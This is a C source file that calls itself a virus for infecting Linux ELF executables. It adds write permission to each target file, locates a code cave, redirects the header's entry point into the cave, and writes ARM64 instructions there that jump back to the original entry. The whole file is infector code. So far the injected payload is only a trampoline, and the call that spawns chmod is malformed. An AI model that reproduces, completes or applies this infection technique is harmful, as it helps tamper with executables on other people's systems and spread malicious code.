// virus.c
// written by Kate Rodionoff
// on 06/10/23
// virus that infects ELF executable files on Linux

// verify that file is an ELF executable
// find entry point
// inject simple code (to start with)

#ifdef __linux__

#include "include/ElfFile.h"
#include "include/CodeCave.h"
#include "include/Arm.h"
#include <fcntl.h>
#include <spawn.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define MIN_ARGS 2

void writePieExecutable(int fd, CodeCave c, Elf64_Addr entry);
void writeExecutable(int fd, CodeCave c, Elf64_Addr entry);

int main(int argc, char **argv) {
    if (argc < MIN_ARGS) {
        fprintf(stdout, "Too few arguments to call program\n");
        exit(0);
    }

    for (int i = 1; i < argc; i++) {
        int fd = open(argv[i], O_RDWR);

        if (!Elf(fd)) {
            fprintf(stderr, "Not elf file!\n");
            goto end;
        }

        // give us write permissions just in case
        char *args[2] = {"+w", argv[i]};
        pid_t pid;
        posix_spawn(&pid, "chmod", NULL, NULL, args, NULL);

        Elf64_Ehdr ehdr = ElfExtractHeader(fd);
        Elf64_Phdr phdr = ElfExtractProgramHeader(fd, ehdr);
        // store the original return address
        Elf64_Addr original = ehdr.e_entry;

        CodeCave codeCave = FindCodeCave(fd, phdr, ehdr, 16);
        printf("CodeCave found at %x\n", codeCave.offset);

        if (!isPie(ehdr)) ehdr.e_entry = phdr.p_vaddr + codeCave.offset;
        else ehdr.e_entry = codeCave.offset;

        printf("New entry point is %x with offset %x\n", ehdr.e_entry, codeCave.offset);
        int err = lseek(fd, 0, SEEK_SET);
        if (err < 0) {
            fprintf(stderr, "Couldn't lseek to start of file\n");
            goto end;
        }
        write(fd, &ehdr, sizeof(ehdr));

        err = lseek(fd, codeCave.offset, SEEK_SET);

        if (err < 0) {
            fprintf(stderr, "Couldn't lseek to code cave position\n");
            goto end;
        }

        if (isPie(ehdr)) writePieExecutable(fd, codeCave, original);
        else writeExecutable(fd, codeCave, original);

        end:
            close(fd);
    }

    return 0;
}

/**
 * Writes the following instructions (in machine code) to a position independent executable:
 *      MOV x22, #0x0
 *      ADRP x22, #0x0
 *      ADD x22, x22, [entry]
 *      BR x22
 * 
 *      Parameters:
 *          - fd (int): file descriptor of ELF executable
 *          - c (CodeCave): struct containing information about region we're writing to
 *          - entry (Elf64_Addr): original entry point of ELF executable
 */
void writePieExecutable(int fd, CodeCave c, Elf64_Addr entry) {
    lseek(fd, c.offset, SEEK_SET);
    write(fd, MOV, 4);

    write(fd, ADRP, 4);

    char *addInstr = add(entry);
    write(fd, addInstr, 4);
    free(addInstr);

    write(fd, BR, 4);
}

/**
 * Writes the following instructions (in machine code) to an ELF executable:
 *      MOV x22, #0x0
 *      ADD x22, x22, [vaddr], lsl #12
 *      ADD x22, x22, [physical offset of original entry]
 *      BR x22
 * 
 *      Parameters:
 *          - fd (int): file descriptor of ELF executable
 *          - c (CodeCave): struct containing information about the region we're writing to
 *          - entry (Elf64_Addr): The original entry point of the ELF executable
 */
void writeExecutable(int fd, CodeCave c, Elf64_Addr entry) {
    lseek(fd, c.offset, SEEK_SET);
    write(fd, MOV, 4);
    
    char *addInstr = add(c.vaddr);
    write(fd, addInstr, 4);

    free(addInstr);

    char *addInstr2 = add(entry - c.vaddr);
    printf("%x %x %x\n", entry - c.vaddr, entry, c.vaddr);
    write(fd, addInstr2, 4);

    free(addInstr2);

    write(fd, BR, 4);
}


#endif
